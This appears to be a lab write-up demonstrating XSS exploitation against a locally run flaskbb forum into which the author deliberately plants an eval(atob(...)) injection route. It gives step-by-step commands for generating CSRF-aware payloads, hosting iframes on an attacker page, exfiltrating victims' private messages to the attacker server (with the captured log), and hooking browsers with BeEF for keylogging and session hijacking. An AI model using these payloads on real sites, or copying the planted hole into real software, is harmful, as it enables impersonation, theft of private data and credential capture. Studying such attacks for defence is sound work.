Attacks
=======
Given a vulnerable application, we will try to develop some realistic attack scenarios. The focus is really not on triggering the XSS, but rather demonstrating ways to fully exploit it.
First we will setup a vulnerable application, then propose 3 different attacks :

    - execute actions on behalf of user
    - steal private information
    - Man In the Browser attack : interactive session hijacking, keylogger, browser exploits...
        
I. Setup the vulnerable application : a forum.
----------------------------------------------
In an attempt to be as realistic as possible, I decided to start with a real full-fledged application. I choose flaskbb[0], a forum developped in python using flask.

First step is to add our extra XSS "feature". I kept it simple by adding a new route to the project, where you can provide base64-encoded javascript to be executed. For example, executing "alert(1)" will look like this :

    localhost:8080/xss/YWxlcnQoMSkK

![Demo : alert(1)](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/alert.png)

The base64 is a handy way to avoid conflicts between our payloads and flask's route matching rules[A], and more important allows us to bypass flask's parameters sanitizing before template generation. It will also work around any protection from the browser. Implementation steps are provided here[1]

Bonus : flaskbb is kind enough to come in the dev version with a test function to populate it with dummy users, topics and posts !

II. Post a message on behalf of a user.
---------------------------------------
First, let's introduce two tools that we will use : 

    burp[2] : an http proxy, often used in web penetration tests because it is awesome. We will just scratch the surface here, using it to log our http traffic.
    xssless[3] : a python script to generate XSS payloads from burp's logs. Best part is that it takes care of crsf tokens (nonces) !

The procedure is as follow : 

    1) log in with a user we control.
    2) start burp's interception
    3) post a new message.
    4) export burp's logs
    5) list the csrf tokens
    6) run xssless
    7) modify the payload with our malicious message
    8) craft our exploit
    9) expose targeted users to our exploit

Steps 1-4 I won't describe.

Step 5 : In the requests that burp intercepted, we look for any parameter that might be a csrf token. It's usually obvious, and it certainly is here.

    echo 'csrf_token' > params

Step 6 : Xssless is nice because we don't even have to have a deep look into what's going on. We could probably skip some requests, but we know that repoducing step by step what we recorded will work. We just need to tell it which parameters to adapt dynamically.

    python2 ~/secu/xssless/xssless.py -s -p params ../burp-logs/post-topic.burp > post-topic.js

You can see the result here[4].

Step 7 : Now you can edit the payload to replace the title or content of the post you want. 

    grep content post-topic.js
        [...] &title=I+think&content=I%27ve+been+hacked+%3A%28 [...]

Just don't forget to url-encode your texts.

Step 8 : At this point we should run our payload through a js minifyer. Here we won't, for the sake of simplicity. To have a working exploit we need however the base64 of our payload, and to remove the script tag :
    
    grep -v script post-topic.js | base64 -w0 > post-topic.b64

Step 9 : Now, all we have to do is put it somewhere on internet and bring authenticated users of our forum to visit it.

    echo "<iframe src='http://localhost:8080/xss/$(cat payloads/post-topic.b64)'></iframe>" > malicious-website/post-topic.html
    cd malicious-website && python3 -m http.server 1337

Step 10 : profit !  
![Exploit : Post a message on behalf of a victim](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/post-topic.png)

III. Read a user's private conversations.
-----------------------------------------

So, here I hand-crafted an exploit[4]. This is classic javascript programming, so I won't explain in detail, but here is the gist :
    
    -request user/messages/inbox
    -parse the response to get received message. We get title, author, and a link to the content
    -request each of thoses new links
    -parse the response to get the content of each message
    -wrap it all in a serialized json, urlencode, and ship it in a GET request to our malicious website.

Of course, like most exploits, this code isn't a piece of art. But hey, it works.

    base64 -w0 read-private.js > read-private.b64

    echo "<iframe src='http://localhost:8080/xss/$(cat payloads/read-private.b64)'></iframe>" > malicious-website/read-private.html
    cd malicious-website && python3 -m http.server 1337

When someone (test2 in my case) visits localhost:1337/read-private.html, assuming he is already authenticated in the forum, our malicious server receives another request :

    "GET /%5B%0A%20%20%7B%0A%20%20%20%20%22author%22%3A%20%22test1%22%2C%0A%20%20%20%20%22title%22%3A%20%22%20Private%20conversation%20is%20private%20%22%2C%0A%20%20%20%20%22content%22%3A%20%22%20Or%20is%20it%20%3F%20%22%0A%20%20%7D%2C%0A%20%20%7B%0A%20%20%20%20%22author%22%3A%20%22test3%22%2C%0A%20%20%20%20%22title%22%3A%20%22%20Another%20%22%2C%0A%20%20%20%20%22content%22%3A%20%22%20%E2%80%9Cprivate%E2%80%9D%20conversation%20%22%0A%20%20%7D%2C%0A%20%20%7B%0A%20%20%20%20%22author%22%3A%20%22test3%22%2C%0A%20%20%20%20%22title%22%3A%20%22%20last%20%22%2C%0A%20%20%20%20%22content%22%3A%20%22%20of%20thoses%20%22%0A%20%20%7D%0A%5D HTTP/1.1" 404 -

    >> rcv="%5B%0...7D%0A%5D"
    >> python2 -c "from urllib import unquote; print unquote('$rcv');"
        [
          {
            "author": "test1",
            "title": " Private conversation is private ",
            "content": " Or is it ? "
          },
          {
            "author": "test3",
            "title": " Another ",
            "content": " “private” conversation "
          },
          {
            "author": "test3",
            "title": " last ",
            "content": " of thoses "
          }
        ]

![Exploit : reading private messages](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/read-private.png)


IV. Steal a user's password, and beyond ! Man In the Browser.
-------------------------------------------------------------

BeEF[6] : It means Browser Exploitation Framework, blablabla
    
Add a beef hook to our page :

    base64 -w0 add-hook.js > add-hook.b64

    echo "<iframe src='http://localhost:8080/xss/$(cat payloads/add-hook.b64)'></iframe>" > malicious-website/add-hook.html
    cd malicious-website && python3 -m http.server 1337

Start beef server, and wait for a visitor.

![BeEF : ui](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/beef-1.png)

Key logger
    
    Start the Man In the Browser attack to keep the target hooked when it follows links on the current domain.

![Demo : MItB](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/beef-MItB.png)

    All actions and inputs are recorded under the "logs" panel.

![BeEF : keylogger](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/beef-keylogger.png)
    
Interactive session hijacking

        Beef > target > use as proxy

![BeEF : use as proxy](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/beef-useproxy.png)

        chromium --temp-profile --proxy-server=localhost:6789

![BeEF : proxy](https://raw.githubusercontent.com/centime/xss-paper/master/screenshots/beef-proxy.png)

    Unfortunately, I couldn't manage to get it to work. The requests stay blocked somewhere between BeEF and the zombie... 


V. Going further.
-----------------
    xssless : worms !


NBs
---
[A] But here I learnt that b64 is "a-zA-Z0-9=" AND... "/".
    I can't figure out why, it seems so broken, but here it is : b64encode('t ?') == 'dCA/Cg=='
    So my url pattern may be broken by b64. Doesn't happen often though.


Refs
----
    [0] https://github.com/sh4nks/flaskbb
    [1] The following modifications have been made to flaskbb[0] :
            forum/views.py (l35-66)
                @forum.route("/xss/<payload>")
                def index(payload):
                [...]
                return( [...],
                    payload=payload)

            templates/forum/index.html (l4)
                <script>eval(atob("{{ payload }}"))</script>
        Also, because of a bug I removed thoses lines :
            templates/forum/topic.html
                {% if topic.first_post_id == post.id %}
                    {% if current_user|delete_topic(topic.first_post.user_id, topic.forum) %}
                    <a href="{{ url_for('forum.delete_topic', topic_id=topic.id, slug=topic.slug) }}">Delete</a> |
                    {% endif %}
                {% else %}
                    {% if current_user|delete_post(post.user_id, topic.forum) %}
                    <a href="{{ url_for('forum.delete_post', post_id=post.id) }}">Delete</a> |
                    {% endif %}
                {% endif %}
        and didn't investigate any further...
    [2] http://portswigger.net/burp/
    [3] https://github.com/mandatoryprogrammer/xssless
    [4] https://github.com/centime/xss-paper/blob/master/payloads/post-topic.js
    [5] https://github.com/centime/xss-paper/blob/master/payloads/read-private.js
    [6] http://beefproject.com/